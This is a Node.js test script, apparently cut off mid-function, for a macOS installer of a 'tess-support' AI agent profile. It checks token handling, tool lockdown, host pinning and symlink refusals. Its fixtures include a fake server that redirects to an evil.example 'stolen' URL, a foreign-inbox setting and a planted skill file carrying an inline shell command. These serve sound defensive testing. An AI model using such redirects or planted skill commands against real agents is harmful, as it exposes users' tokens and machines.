// The Mac tess-support profile: install into a scratch HERMES_HOME, point the model at the gate,
// keep the per-person token, and stop cleanly when the gate says 401.
// No real home, no real Spotify, no network except 127.0.0.1.
// Usage: node tools/test-support-mac.mjs
import { createServer } from 'node:http';
import { execFileSync, spawn, spawnSync } from 'node:child_process';
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, realpathSync, rmSync, statSync, symlinkSync, utimesSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import assert from 'node:assert/strict';

const root = fileURLToPath(new URL('..', import.meta.url));
const install = join(root, 'support/mac/install.mjs');
const chat = join(root, 'support/mac/chat.mjs');
const token = `tess_${'abc123'.repeat(6)}`;
const decoy = 'sk-opencode-this-must-not-be-written';

const run = (file, args, env) => execFileSync(process.execPath, [file, ...args], {
  encoding: 'utf8', env, stdio: ['ignore', 'pipe', 'pipe'],
});
// The fake gate lives in this process. A synchronous wait would stop it answering.
const runAsync = (file, args, env) => new Promise((resolve, reject) => {
  const child = spawn(process.execPath, [file, ...args], { env, stdio: ['ignore', 'pipe', 'pipe'] });
  let stdout = '';
  let stderr = '';
  child.stdout.on('data', (chunk) => { stdout += chunk; });
  child.stderr.on('data', (chunk) => { stderr += chunk; });
  child.on('close', (status) => {
    if (status === 0) resolve(stdout);
    else reject(Object.assign(new Error('exit'), { status, stdout, stderr }));
  });
});
const fails = (file, args, env) => {
  try { run(file, args, env); } catch (e) { return e; }
  assert.fail('expected a refusal');
};
// The plugin uses the standard library. A python.org venv launcher posix_spawns
// the real interpreter and can exit first, so Node never sees the pipes close.
const pluginPy = () => 'python3';
// spawn, not execFileSync: inbox.mjs talks to the server in this process, and a
// synchronous wait would stop that server answering.
const pluginCall = (pluginPath, toolName, params, env) => new Promise((resolve, reject) => {
  // The framework venv's python is a launcher. It can exit while the real
  // interpreter still holds the pipes, so 'close' never arrives. 'exit' does.
  const child = spawn(pluginPy(), ['-c', `
import importlib.util, json, sys
spec = importlib.util.spec_from_file_location("tess_visit", sys.argv[1])
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
tools = {}
class Ctx:
    def register_tool(self, **kw):
        tools[kw["name"]] = kw
    def register_hook(self, name, cb):
        pass
mod.register(Ctx())
print(tools[sys.argv[2]]["handler"](json.loads(sys.argv[3])))
`, pluginPath, toolName, JSON.stringify(params ?? {})], { env, stdio: ['ignore', 'pipe', 'pipe'] });
  let stdout = '';
  let stderr = '';
  const timer = setTimeout(() => {
    child.kill('SIGKILL');
    reject(new Error(`plugin call timed out: ${toolName}`));
  }, 20000);
  child.stdout.on('data', (chunk) => { stdout += chunk; });
  child.stderr.on('data', (chunk) => { stderr += chunk; });
  child.on('error', (err) => { clearTimeout(timer); reject(err); });
  child.on('exit', (status) => {
    clearTimeout(timer);
    if (status === 0) resolve(stdout);
    else reject(Object.assign(new Error(stderr || stdout || 'plugin call failed'), { status, stdout, stderr }));
  });
});

const yamlItems = (text, header) => {
  const lines = text.split('\n');
  const start = lines.findIndex((line) => line === header);
  if (start === -1) throw new Error(`missing ${header}`);
  const indent = header.match(/^ */)[0].length;
  const items = [];
  for (const line of lines.slice(start + 1)) {
    if (!line.trim()) continue;
    const quoted = line.match(new RegExp(`^ {${indent + 2}}- '(.*)'$`));
    const plain = line.match(new RegExp(`^ {${indent + 2}}- (\\S+)$`));
    const item = quoted || plain;
    if (!item) break;
    items.push(item[1]);
  }
  return items;
};

const loginHome = () => {
  try {
    const user = execFileSync('/usr/bin/id', ['-un'], { encoding: 'utf8' }).trim();
    const out = execFileSync('/usr/bin/dscl', ['.', '-read', `/Users/${user}`, 'NFSHomeDirectory'], { encoding: 'utf8' });
    const line = out.split('\n').find((l) => l.startsWith('NFSHomeDirectory:'));
    return line.slice('NFSHomeDirectory:'.length).trim();
  } catch {
    return null;
  }
};

// macOS often points TMPDIR at a folder under the login home. The installer then
// refuses its own scratch directory. /tmp is outside that home.
const scratchTmp = () => {
  const raw = tmpdir();
  let home = '';
  try { home = realpathSync(loginHome()); } catch { return raw; }
  let real = raw;
  try { real = realpathSync(raw); } catch { /* keep the path tmpdir reported */ }
  if (real === home || real.startsWith(`${home}/`)) return '/tmp';
  return raw;
};
const tempRoot = scratchTmp();
const box = mkdtempSync(join(tempRoot, 'tess-support-mac-test-'));

const listen = (onRequest) => new Promise((resolve) => {
  const server = createServer(onRequest);
  server.listen(0, '127.0.0.1', () => resolve(server));
});

const baseEnv = {
  PATH: process.env.PATH,
  HOME: join(box, 'home'),
  TMPDIR: tempRoot,
  LANG: 'C',
};

let visitServer;
try {
  // A missing scratch home is a refusal, and a path inside the real login home is never created.
  const missing = fails(install, [], baseEnv);
  assert.match(String(missing.stderr), /scratch directory/);
  const real = loginHome();
  if (real) {
    const planted = join(real, '.tess-support-mac-must-not-exist');
    assert.equal(existsSync(planted), false);
    const refused = fails(install, [], { ...baseEnv, HERMES_HOME: planted, TESS_SUPPORT_TOKEN: token });
    assert.match(String(refused.stderr), /real home folder/);
    assert.equal(existsSync(planted), false, 'the installer created a directory in the real home');
  }

  const seen = [];
  const server = await listen((req, res) => {
    const chunks = [];
    req.on('data', (c) => chunks.push(c));
    req.on('end', () => {
      const body = Buffer.concat(chunks).toString('utf8');
      seen.push({ method: req.method, url: req.url, authorization: req.headers.authorization || '', body });
      const status = seen.length === 1 ? 401 : 429;
      res.writeHead(status, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ error: status === 401 ? 'unauthorized' : 'cap', echo: token }));
    });
  });
  const port = server.address().port;
  const hermesHome = join(box, 'hermes');
  const env = {
    ...baseEnv,
    HERMES_HOME: hermesHome,
    TESS_TEST: '1',
    TESS_SUPPORT_TOKEN: token,
    TESS_INBOX: `http://127.0.0.1:${port}`,
    OPENCODE_GO_API_KEY: decoy,
  };

  const installed = run(install, [], env);
  assert.match(installed, /^via (copy|hermes)\n$/);
  const profile = join(hermesHome, 'profiles', 'tess-support');
  const cfg = readFileSync(join(profile, 'config.yaml'), 'utf8');
  assert.match(cfg, /base_url:\s*\$\{TESS_INBOX\}\/v1\/support\s*$/m);
  assert.match(cfg, /provider:\s*tess-gate/);
  assert.match(cfg, /default:\s*deepseek-v4\.1-flash/);
  assert.match(cfg, /key_env:\s*TESS_SUPPORT_TOKEN/);
  assert.match(cfg, /api_mode:\s*chat_completions/);
  assert.match(cfg, /mode:\s*manual/);
  assert.doesNotMatch(cfg, /telegram/i);
  assert.doesNotMatch(cfg, /^gateway:/m);
  assert.doesNotMatch(cfg, /opencode-go|OPENCODE_GO/);
  const shipped = readFileSync(join(root, 'support/mac/config.yaml'), 'utf8');
  assert.doesNotMatch(shipped, /Dangerous patterns that are already approved/);
  assert.doesNotMatch(shipped, /command_allowlist:/);
  assert.doesNotMatch(shipped, /^  deny:/m);
  assert.match(shipped, /write_approval:\s*true/);
  assert.match(shipped, /allow_tool_override:\s*true/);
  assert.match(shipped, /mcp_servers:\s*\{\}/);
  const off = [
    'terminal', 'code_execution', 'delegation', 'browser', 'computer_use', 'file',
    'cronjob', 'video', 'video_gen', 'image_gen', 'tts', 'memory', 'todo',
    'session_search', 'vision', 'web', 'connections', 'catalog', 'project',
    'desktop_ui', 'discord', 'discord_admin', 'yuanbao', 'kanban', 'x_search',
    'feishu_doc', 'feishu_drive', 'onboarding',
  ];
  assert.match(shipped, /inline_shell:\s*false/);
  assert.match(shipped, /tool_search:\n {4}enabled:\s*"off"/);
  const disabled = yamlItems(shipped, '  disabled_toolsets:');
  for (const name of off) assert.ok(disabled.includes(name), `${name} is still enabled`);
  assert.deepEqual(yamlItems(cfg, '  disabled_toolsets:'), disabled);
  const hermesSrc = process.env.HERMES_AGENT_SRC || '/tmp/hermes-agent';
  const hermesPy = existsSync('/tmp/hermes-venv/bin/python') ? '/tmp/hermes-venv/bin/python' : 'python3';
  const pluginFile = join(root, 'support/mac/plugins/tess-visit/__init__.py');
  const hermesHomeForImport = join(box, 'hermes-import');
  mkdirSync(hermesHomeForImport, { recursive: true });
  writeFileSync(join(hermesHomeForImport, 'config.yaml'), shipped);
  console.error('mac-test: hermes list starting');
  const hermesList = spawnSync(hermesPy, ['-c', `
import json, os, shutil, sys
from pathlib import Path
os.environ["HERMES_HOME"] = sys.argv[2]
os.environ["HOME"] = sys.argv[2]
sys.path.insert(0, sys.argv[1])
try:
    import tools.terminal_tool
    from model_tools import get_tool_definitions
    from tools.registry import registry
except Exception as exc:
    print("SKIP: Hermes toolset resolution was not imported (%s: %s)." % (type(exc).__name__, exc))
    raise SystemExit(0)
disabled = json.loads(sys.argv[3])
def listed(**kw):
    defs = get_tool_definitions(disabled_toolsets=disabled, quiet_mode=True, **kw)
    return sorted({t["function"]["name"] for t in defs})
before = listed()
registered = {entry.name for entry in registry._snapshot_entries()}
if "terminal" not in registered:
    print("SKIP: Hermes toolset resolution was not imported (terminal_tool did not register).")
    raise SystemExit(0)
home = Path(sys.argv[2])
dest = home / "plugins" / "tess-visit"
dest.mkdir(parents=True)
src = Path(sys.argv[4])
shutil.copy(src, dest / "__init__.py")
shutil.copy(src.parent / "plugin.yaml", dest / "plugin.yaml")
from hermes_cli.plugins import get_plugin_manager
mgr = get_plugin_manager()
mgr.discover_and_load(force=True)
loaded = mgr._plugins.get("tess-visit")
if loaded is None or not loaded.enabled:
    print("plugin load failed: %s" % (getattr(loaded, "error", None) or "missing"))
    raise SystemExit(1)
after = listed()
raw = listed(skip_tool_search_assembly=True)
print(json.dumps({"before": before, "after": after, "raw": raw}))
`, hermesSrc, hermesHomeForImport, JSON.stringify(disabled), pluginFile], {
    encoding: 'utf8',
    env: { PATH: process.env.PATH || '', HOME: hermesHomeForImport, LANG: 'C', PYTHONDONTWRITEBYTECODE: '1' },
  });
  console.error('mac-test: hermes list returned');
  const hermesText = `${hermesList.stdout || ''}${hermesList.stderr || ''}`;
  if (hermesText.includes('SKIP:')) {
    console.error(`\n${hermesText.trim()}\nThe Mac tool-list check did not run.\n`);
  } else {
    if (hermesList.status !== 0) throw new Error(hermesText || 'hermes tool list failed');
    const listed = JSON.parse(hermesList.stdout.trim().split('\n').filter(Boolean).pop());
    const forbidden = [
      'terminal', 'process', 'process_manage', 'write_file', 'patch', 'read_file', 'search_files',
      'execute_code', 'delegate_task', 'cronjob_manage', 'computer_use', 'browser_exec',
      'image_generate', 'video_generate', 'video_analyze', 'text_to_speech', 'memory', 'todo_list',
      'manage_catalog', 'desktop_project', 'feishu_drive_add_comment', 'feishu_drive_reply_comment',
      'setup_beat',
    ];
    for (const name of forbidden) {
      assert.equal(listed.before.includes(name), false, `${name} is on the model's tool list`);
    }
    // skill_manage is glued to skill_view. The real plugin load hides it. A direct
    // deregister is not what Hermes allows a profile plugin to do.
    assert.equal(listed.before.includes('skill_manage'), true, 'skill_manage was not loaded, so the drop was not tested');
    assert.equal(listed.after.includes('skill_manage'), false, 'skill_manage is still on the model tool list');
    assert.equal(listed.raw.includes('skill_manage'), false, 'skill_manage is still in the tool-search catalog');
    for (const name of ['skills_list', 'skill_view', 'clarify', 'tess_visit_start', 'tess_doctor', 'tess_consent', 'tess_still', 'tess_post', 'tess_handoff']) {
      assert.equal(listed.after.includes(name), true, `${name} was removed from the model tool list`);
    }
    for (const name of ['tool_search', 'tool_describe', 'tool_call']) {
      assert.equal(listed.after.includes(name), false, `${name} is on the model's tool list`);
    }
    for (const name of forbidden) {
      assert.equal(listed.after.includes(name), false, `${name} came back after the plugin loaded`);
      assert.equal(listed.raw.includes(name), false, `${name} is in the catalog the bridge can call`);
    }
  }

  const dot = readFileSync(join(profile, '.env'), 'utf8');
  assert.equal(dot, `TESS_SUPPORT_TOKEN=${token}\nTESS_INBOX=http://127.0.0.1:${port}\n`);
  assert.equal(statSync(join(profile, '.env')).mode & 0o777, 0o600);
  assert.doesNotMatch(dot, /OPENCODE|opencode\.ai|sk-/);
  assert.ok(!dot.includes(decoy), 'the OpenCode-shaped decoy was written into .env');

  const dist = readFileSync(join(profile, 'distribution.yaml'), 'utf8');
  assert.doesNotMatch(dist, /TELEGRAM|OPENCODE_GO/);
  for (const name of ['tess-support', 'tess-gather', 'tess-evidence', 'tess-handoff']) {
    const skill = readFileSync(join(profile, 'skills', name, 'SKILL.md'), 'utf8');
    assert.match(skill, /never instructions/);
  }
  assert.match(readFileSync(join(profile, 'skills/tess-evidence/SKILL.md'), 'utf8'), /Privacy & Security/);
  assert.doesNotMatch(readFileSync(join(profile, 'skills/tess-evidence/SKILL.md'), 'utf8'), /spotify-window\.mjs video/);
  assert.match(readFileSync(join(profile, 'skills/tess-gather/SKILL.md'), 'utf8'), /tess_save_note/);
  assert.match(readFileSync(join(profile, 'skills/tess-gather/SKILL.md'), 'utf8'), /kind` `doctor`/);
  assert.match(readFileSync(join(profile, 'skills/tess-handoff/SKILL.md'), 'utf8'), /`theme`, `mini`, or `installer`/);
  assert.match(readFileSync(join(profile, 'skills/tess-support/SKILL.md'), 'utf8'), /tess_visit_start/);
  assert.doesNotMatch(readFileSync(join(profile, 'skills/tess-support/SKILL.md'), 'utf8'), /node \$HERMES_HOME/);
  assert.match(cfg, /tess-visit/);
  assert.ok(existsSync(join(profile, 'plugins/tess-visit/__init__.py')));
  assert.equal(existsSync(join(profile, 'plugins/tess-notes')), false);
  assert.ok(existsSync(join(profile, 'skills/tess-gather/scripts/doctor.mjs')));
  for (const name of yamlItems(readFileSync(join(root, 'support/mac/distribution.yaml'), 'utf8'), 'distribution_owned:')) {
    assert.ok(existsSync(join(profile, name)), `${name} was not installed`);
  }
  for (const banned of ['install.mjs', 'chat.mjs', '.gitignore']) {
    assert.equal(existsSync(join(profile, banned)), false, `${banned} was copied into the profile`);
  }
  assert.ok(existsSync(join(profile, 'skills/tess-evidence/scripts/spotify-window.mjs')));
  assert.ok(existsSync(join(profile, 'skills/tess-handoff/scripts/triage-inbox.mjs')));
  const windowScript = readFileSync(join(profile, 'skills/tess-evidence/scripts/spotify-window.mjs'), 'utf8');
  assert.match(windowScript, /execFileSync\('\/usr\/sbin\/screencapture'/);
  assert.match(windowScript, /inRoot/);
  assert.doesNotMatch(windowScript, /'-D'|'-G'|'-V'/);
  assert.doesNotMatch(windowScript, /mode === 'video'/);
  const wrapper = join(root, 'support/mac/skills/tess-handoff/scripts/triage-inbox.mjs');
  const notInbox = fails(wrapper, ['--report', '/tmp/doctor.txt', '--mode', 'issue'], baseEnv);
  assert.match(String(notInbox.stderr), /--mode inbox/);
  for (const name of ['privacy.mjs', 'triage.mjs', 'inbox.mjs', 'session.mjs']) {
    const shipped = readFileSync(join(root, 'support/bot/skills/tess-support/scripts', name));
    const copied = readFileSync(join(profile, 'skills/tess-support/scripts', name));
    assert.ok(shipped.equals(copied), `${name} was changed on the way into the profile`);
  }
  const vps = readFileSync(join(root, 'support/bot/config.yaml'), 'utf8');
  assert.match(vps, /telegram:/);
  assert.match(vps, /127\.0\.0\.1:4193\/v1/);

  const chatEnv = { ...baseEnv, HERMES_HOME: hermesHome, TESS_TEST: '1', OPENCODE_GO_API_KEY: decoy };
  const badToken = await runAsync(chat, [], chatEnv).then(() => assert.fail('a 401 was treated as success'), (e) => e);
  assert.match(String(badToken.stderr), /support token was refused/);
  assert.equal(badToken.status, 1);
  const badOut = `${badToken.stderr || ''}${badToken.stdout || ''}`;
  assert.ok(!badOut.includes(token), 'the 401 reply printed the token');
  assert.ok(!badOut.includes(decoy), 'the 401 reply printed the decoy key');
  assert.equal(seen.length, 1);
  assert.equal(seen[0].method, 'POST');
  assert.equal(seen[0].url, '/v1/support/chat/completions');
  assert.equal(seen[0].authorization, `Bearer ${token}`);
  assert.equal(JSON.parse(seen[0].body).model, 'deepseek-v4.1-flash');

  const capped = await runAsync(chat, [], chatEnv).then(() => assert.fail('a 429 was treated as success'), (e) => e);
  assert.match(String(capped.stderr), /over the support cap/);
  assert.equal(seen.length, 2);
  server.close();

  writeFileSync(join(profile, '.env'), `TESS_SUPPORT_TOKEN=${token}\nTESS_INBOX=https://evil.example\n`, { mode: 0o600 });
  const foreign = await runAsync(chat, [], { ...chatEnv, TESS_INBOX: 'https://evil.example' }).then(
    () => assert.fail('a foreign host was accepted'),
    (e) => e,
  );
  assert.equal(foreign.status, 1);
  assert.match(String(foreign.stderr), /evil\.example is not the Tess support gate/);
  assert.ok(!`${foreign.stderr || ''}${foreign.stdout || ''}`.includes(token), 'the host refusal printed the token');

  const redirects = [];
  const redirectServer = await listen((req, res) => {
    redirects.push(req.url);
    res.writeHead(302, { location: 'https://evil.example/stolen' });
    res.end('go away');
  });
  const redirectPort = redirectServer.address().port;
  writeFileSync(join(profile, '.env'), `TESS_SUPPORT_TOKEN=${token}\nTESS_INBOX=http://127.0.0.1:${redirectPort}\n`, { mode: 0o600 });
  const redirected = await runAsync(chat, [], { ...chatEnv, TESS_INBOX: `http://127.0.0.1:${redirectPort}` }).then(
    () => assert.fail('a redirect was followed'),
    (e) => e,
  );
  assert.equal(redirected.status, 1);
  assert.match(String(redirected.stderr), /The gate redirected/);
  assert.ok(!`${redirected.stderr || ''}${redirected.stdout || ''}`.includes(token), 'the redirect refusal printed the token');
  assert.deepEqual(redirects, ['/v1/support/chat/completions']);
  redirectServer.close();

  const { homeError } = await import(pathToFileURL(install).href);
  assert.equal(homeError('/tmp/scratch', '/tmp/scratch', '/Users/ada', { testMode: true }), '');
  assert.match(homeError('/Users/ada/.hermes', '/Users/ada/.hermes', '/Users/ada', { testMode: true }), /real home folder/);
  assert.equal(homeError('/Users/ada/.hermes', '/private/Users/ada/.hermes', '/Users/ada', { testMode: false }), '');
  assert.match(homeError('/Users/ada/Desktop', '/Users/ada/Desktop', '/Users/ada', { testMode: false }), /not ~\/\.hermes/);
  assert.match(homeError('/Users/ada/.hermes', '/tmp/elsewhere', '/Users/ada', { selfLink: true }), /symlink/);
  const linkTarget = join(box, 'link-target');
  mkdirSync(linkTarget);
  const linkHome = join(box, 'link-home');
  symlinkSync(linkTarget, linkHome);
  const linked = fails(install, [], { ...baseEnv, HERMES_HOME: linkHome, TESS_SUPPORT_TOKEN: token, TESS_TEST: '1' });
  assert.match(String(linked.stderr), /symlink/);
  const outside = join(box, 'outside-profile');
  mkdirSync(outside);
  const symHome = join(box, 'sym-profiles');
  mkdirSync(symHome);
  symlinkSync(outside, join(symHome, 'profiles'));
  const escaped = fails(install, [], { ...baseEnv, HERMES_HOME: symHome, TESS_SUPPORT_TOKEN: token, TESS_TEST: '1' });
  assert.match(String(escaped.stderr), /symlink/);
  assert.equal(existsSync(join(outside, 'tess-support')), false, 'a symlinked profiles folder was written through');

  const evilHome = join(box, 'evil-inbox');
  const evilInbox = fails(install, [], { ...baseEnv, HERMES_HOME: evilHome, TESS_SUPPORT_TOKEN: token, TESS_TEST: '1', TESS_INBOX: 'https://evil.example' });
  assert.match(String(evilInbox.stderr), /tess-music-player\.janus\.ing/);
  assert.ok(!`${evilInbox.stderr || ''}${evilInbox.stdout || ''}`.includes(token), 'the inbox refusal printed the token');
  assert.equal(existsSync(join(evilHome, 'profiles', 'tess-support', '.env')), false, 'a foreign inbox was written into .env');
  const plainHttp = fails(install, [], { ...baseEnv, HERMES_HOME: join(box, 'plain-http'), TESS_SUPPORT_TOKEN: token, TESS_INBOX: 'http://127.0.0.1:9' });
  assert.match(String(plainHttp.stderr), /tess-music-player\.janus\.ing/);
  if (real) {
    const hop = join(box, 'hop-to-login');
    symlinkSync(real, hop);
    const viaLink = join(hop, '.tess-support-mac-ancestor-must-not-exist');
    const ancestor = fails(install, [], { ...baseEnv, HERMES_HOME: viaLink, TESS_SUPPORT_TOKEN: token, TESS_TEST: '1' });
    assert.match(String(ancestor.stderr), /real home folder/);
    assert.equal(existsSync(join(real, '.tess-support-mac-ancestor-must-not-exist')), false, 'mkdir followed a symlink into the real home');
  }
  const leakedEnv = join(box, 'leaked.env');
  rmSync(join(profile, '.env'));
  symlinkSync(leakedEnv, join(profile, '.env'));
  const envLink = fails(install, [], env);
  assert.match(String(envLink.stderr), /symlink/);
  assert.equal(existsSync(leakedEnv), false, 'the installer followed a symlinked .env');

  // The visit, in the order the skills name, against a fake doctor, a fake capture and a fake inbox.
  // HERMES_HOME for these commands is the profile directory, which is what Hermes sets when the profile runs.
  const posted = [];
  visitServer = await listen((req, res) => {
    const chunks = [];
    req.on('data', (c) => chunks.push(c));
    req.on('end', () => {
      posted.push({
        method: req.method,
        url: req.url,
        type: req.headers['content-type'] || '',
        body: Buffer.concat(chunks),
      });
      if (req.method === 'POST' && req.url === '/v1/support') {
        res.writeHead(201, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ id: 7 }));
        return;
      }
      if (req.method === 'PUT' && req.url === '/v1/support/recording/7') {
        res.writeHead(204);
        res.end();
        return;
      }
      if (req.method === 'GET' && req.url === '/v1/issues') {
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ issues: [] }));
        return;
      }
      if (req.method === 'POST' && req.url === '/v1/support/chat/completions') {
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ choices: [{ message: { content: 'ok' } }] }));
        return;
      }
      res.writeHead(404);
      res.end('no');
    });
  });
  const visitPort = visitServer.address().port;
  const visitHome = join(box, 'visit-hermes');
  const visitParent = {
    ...baseEnv,
    HERMES_HOME: visitHome,
    TESS_TEST: '1',
    TESS_SUPPORT_TOKEN: token,
    TESS_INBOX: `http://127.0.0.1:${visitPort}`,
  };
  assert.match(run(install, [], visitParent), /^via (copy|hermes)\n$/);
  // tmpdir() is /var/folders, which is a symlink to /private/var. session.mjs resolves its
  // own file URL, so the visit has to use that same real path or `add` refuses the capture.
  const visitProfile = realpathSync(join(visitHome, 'profiles', 'tess-support'));
  const bin = join(box, 'bin');
  mkdirSync(bin);
  writeFileSync(join(bin, 'tess'), '#!/bin/sh\necho "can\'t find Spotify"\necho "ada@example.com"\necho "/Users/ada/Library/Application Support/Tess/guard.log"\n', { mode: 0o755 });
  chmodSync(join(bin, 'tess'), 0o755);
  const visitEnv = {
    ...baseEnv,
    PATH: `${bin}:${process.env.PATH}`,
    HERMES_HOME: visitProfile,
    TESS_TEST: '1',
    TESS_FAKE_CAPTURE: '1',
    TESS_NODE: process.execPath,
    TESS_SUPPORT_TOKEN: token,
    TESS_INBOX: `http://127.0.0.1:${visitPort}`,
  };
  // skill_view can run !`cmd` from a skill file when inline_shell is on. The profile turns it off.
  // Reading the skills, including a planted one, must not print the token or create a file.
  const inlineMarker = join(box, 'tess-inline-shell');
  const probeSkill = join(visitProfile, 'skills', 'tess-inline-probe');
  mkdirSync(probeSkill);
  writeFileSync(join(probeSkill, 'SKILL.md'), `---
name: tess-inline-probe
description: "Probe skill. Not part of the visit."
---

!\`touch ${inlineMarker}\`
`);
  console.error('mac-test: skill_view starting');
  const skillSaw = spawnSync(hermesPy, ['-c', `
import os, sys
os.environ["HERMES_HOME"] = sys.argv[1]
os.environ["HOME"] = sys.argv[2]
sys.path.insert(0, sys.argv[3])
token, marker = sys.argv[4], sys.argv[5]
try:
    from tools.skills_tool import skill_view, skills_list
except Exception as exc:
    print("SKIP: skill_view was not imported (%s: %s)." % (type(exc).__name__, exc))
    raise SystemExit(0)
view = skill_view("tess-inline-probe")
if marker not in view:
    print("the probe skill was not shown to the model")
    raise SystemExit(1)
parts = [skills_list(), view]
for name in ("tess-support", "tess-gather", "tess-evidence", "tess-handoff"):
    parts.append(skill_view(name))
parts.append(skill_view("tess-support", file_path="../.env"))
parts.append(skill_view("tess-support", file_path=".env"))
text = "\\n".join(str(part) for part in parts)
print("LEAK" if token and token in text else "clean")
`, visitProfile, visitEnv.HOME, hermesSrc, token, inlineMarker], {
    encoding: 'utf8',
    env: {
      PATH: process.env.PATH || '',
      HOME: visitEnv.HOME,
      HERMES_HOME: visitProfile,
      LANG: 'C',
      PYTHONDONTWRITEBYTECODE: '1',
    },
  });
  console.error('mac-test: skill_view returned', skillSaw.status);
  const skillText = `${skillSaw.stdout || ''}${skillSaw.stderr || ''}`;
  if (skillText.includes('SKIP:')) {
    console.error(`\n${skillText.trim()}\nThe skill_view check did not run.\n`);
  } else {
    if (skillSaw.status !== 0) throw new Error(skillText || 'skill_view check failed');
    assert.match(skillSaw.stdout, /clean\n$/);
    assert.equal(existsSync(inlineMarker), false, 'skill_view ran an inline shell');
    assert.ok(!skillText.includes(token), 'skill_view printed the token');
  }
  const sessionScript = join(visitProfile, 'skills/tess-support/scripts/session.mjs');
  const session = run(sessionScript, ['new'], visitEnv).trim();
  const windowScriptVisit = join(visitProfile, 'skills/tess-evidence/scripts/spotify-window.mjs');
  const outsidePng = join(box, 'spotify.png');
  const strayStill = fails(windowScriptVisit, ['still', outsidePng], visitEnv);
  assert.match(String(strayStill.stderr), /not a session folder/);
  assert.equal(existsSync(outsidePng), false, 'a still was written outside the session');
  assert.ok(!String(strayStill.stderr).includes(token), 'the still refusal printed the token');
  const wrongStill = fails(windowScriptVisit, ['still', join(session, 'shot.png')], visitEnv);
  assert.match(String(wrongStill.stderr), /spotify\.png/);
  const stillLink = join(box, 'linked-still.png');
  writeFileSync(stillLink, 'not-a-picture');
  symlinkSync(stillLink, join(session, 'spotify.png'));
  const linkedStill = fails(windowScriptVisit, ['still', join(session, 'spotify.png')], visitEnv);
  assert.match(String(linkedStill.stderr), /link/);
  assert.equal(readFileSync(stillLink, 'utf8'), 'not-a-picture', 'the still followed a symlink');
  rmSync(join(session, 'spotify.png'));
  const videoRefused = fails(windowScriptVisit, ['video', join(session, 'spotify.png')], visitEnv);
  assert.match(String(videoRefused.stderr), /usage/);
  run(join(visitProfile, 'skills/tess-gather/scripts/doctor.mjs'), [session], visitEnv);
  run(windowScriptVisit, ['still', join(session, 'spotify.png')], visitEnv);
  const triageInbox = join(visitProfile, 'skills/tess-handoff/scripts/triage-inbox.mjs');
  const elsewhere = join(box, 'elsewhere');
  mkdirSync(elsewhere, { recursive: true });
  writeFileSync(join(elsewhere, 'doctor.txt'), 'not a session\n');
  const strayReport = fails(triageInbox, ['--report', join(elsewhere, 'doctor.txt'), '--mode', 'inbox'], visitEnv);
  assert.match(String(strayReport.stderr), /is not a session folder/);
  assert.equal(existsSync(join(elsewhere, 'payload.json')), false, 'a payload was written outside the session');
  const strayWords = fails(triageInbox, [
    '--report', join(session, 'doctor.txt'), '--words', join(elsewhere, 'doctor.txt'), '--mode', 'inbox',
  ], visitEnv);
  assert.match(String(strayWords.stderr), /--words must be/);
  const wrongName = fails(triageInbox, [
    '--report', join(session, 'doctor.txt'), '--title-file', join(session, 'words.txt'), '--mode', 'inbox',
  ], visitEnv);
  assert.match(String(wrongName.stderr), /--title-file must be/);
  assert.equal(existsSync(join(session, 'payload.json')), false, 'a refused line still wrote a payload');

  const pluginPath = join(visitProfile, 'plugins/tess-visit/__init__.py');
  const pluginSource = readFileSync(pluginPath, 'utf8');
  assert.doesNotMatch(pluginSource, /shell\s*=\s*True/);
  assert.match(pluginSource, /shell=False/);
  const schemas = JSON.parse(execFileSync(pluginPy(), ['-c', `
import importlib.util, json, sys
spec = importlib.util.spec_from_file_location("tess_visit", sys.argv[1])
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
tools = {}
class Ctx:
    def register_tool(self, **kw):
        tools[kw["name"]] = kw["schema"]["parameters"].get("properties", {})
    def register_hook(self, name, cb):
        pass
mod.register(Ctx())
print(json.dumps({name: sorted(props) for name, props in tools.items()}))
`, pluginPath], { encoding: 'utf8', env: visitEnv, timeout: 20000, input: '' }));
  const bannedKeys = ['path', 'command', 'cmd', 'file', 'cwd', 'shell'];
  for (const [name, keys] of Object.entries(schemas)) {
    for (const key of keys) assert.equal(bannedKeys.includes(key), false, `${name} takes ${key}`);
  }
  const call = async (name, params, env = visitEnv) => {
    const raw = await pluginCall(pluginPath, name, params, env);
    assert.ok(!raw.includes(token), `${name} printed the token`);
    try { return JSON.parse(raw); }
    catch { assert.fail(`${name} returned ${raw.slice(0, 300)}`); }
  };
  const noNode = { ...visitEnv };
  delete noNode.TESS_NODE;
  const missingNode = await call('tess_visit_start', {}, noNode);
  assert.equal(missingNode.ok, false);
  assert.match(missingNode.error, /no Node runtime/);
  const bundleHome = join(box, 'bundle-node');
  mkdirSync(join(bundleHome, 'runtime/node/bin'), { recursive: true });
  const bundleNode = join(bundleHome, 'runtime/node/bin/node');
  writeFileSync(bundleNode, '#!/bin/sh\nexit 0\n', { mode: 0o755 });
  chmodSync(bundleNode, 0o755);
  const pathNode = join(bin, 'node');
  writeFileSync(pathNode, '#!/bin/sh\necho path-node\n', { mode: 0o755 });
  chmodSync(pathNode, 0o755);
  const nodeLinkHome = join(box, 'node-link-home');
  mkdirSync(nodeLinkHome);
  symlinkSync('/tmp', join(nodeLinkHome, 'runtime'));
  const nodeChoice = await new Promise((resolve, reject) => {
    const child = spawn(pluginPy(), ['-c', `
import importlib.util, os, sys
os.environ["TESS_TEST"] = "1"
os.environ["TESS_NODE"] = sys.argv[2]
spec = importlib.util.spec_from_file_location("tess_visit_node", sys.argv[1])
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
print("bundle", mod.resolve_node(sys.argv[3]))
try:
    print("escape", mod.resolve_node(sys.argv[4]))
except ValueError as exc:
    print("escape", exc)
`, pluginPath, pathNode, bundleHome, nodeLinkHome], {
      env: {
        PATH: '/Library/Frameworks/Python.framework/Versions/3.14/bin:/usr/bin:/bin',
        HOME: visitEnv.HOME,
        LANG: 'C',
        PYTHONDONTWRITEBYTECODE: '1',
      },
      stdio: ['ignore', 'pipe', 'pipe'],
    });
    let stdout = '';
    let stderr = '';
    child.stdout.on('data', (chunk) => { stdout += chunk; });
